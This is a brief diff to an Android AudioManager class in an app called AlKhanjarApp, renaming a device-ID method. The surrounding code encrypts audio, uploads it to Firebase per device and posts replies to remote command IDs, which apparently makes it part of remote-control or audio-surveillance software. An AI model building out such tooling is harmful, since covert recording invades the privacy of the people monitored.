@@ -81,7 +81,7 @@ public class AudioManager {
             byte[] encryptedData = CryptoManager.encryptBytes(audioData);
             
             FirebaseStorage storage = FirebaseStorage.getInstance();
-            String fileName = "audio/" + AlKhanjarApp.getDeviceId() + "/" + System.currentTimeMillis() + ".3gp";
+            String fileName = "audio/" + AlKhanjarApp.getDeviceUniqueId() + "/" + System.currentTimeMillis() + ".3gp";
             StorageReference storageRef = storage.getReference().child(fileName);
             
             storageRef.putBytes(encryptedData)
@@ -112,7 +112,7 @@ public class AudioManager {
         try {
             FirebaseDatabase database = FirebaseDatabase.getInstance();
             DatabaseReference responseRef = database.getReference("responses")
-                .child(AlKhanjarApp.getDeviceId())
+                .child(AlKhanjarApp.getDeviceUniqueId())
                 .child(commandId);
             
             Map<String, Object> response = new HashMap<>();
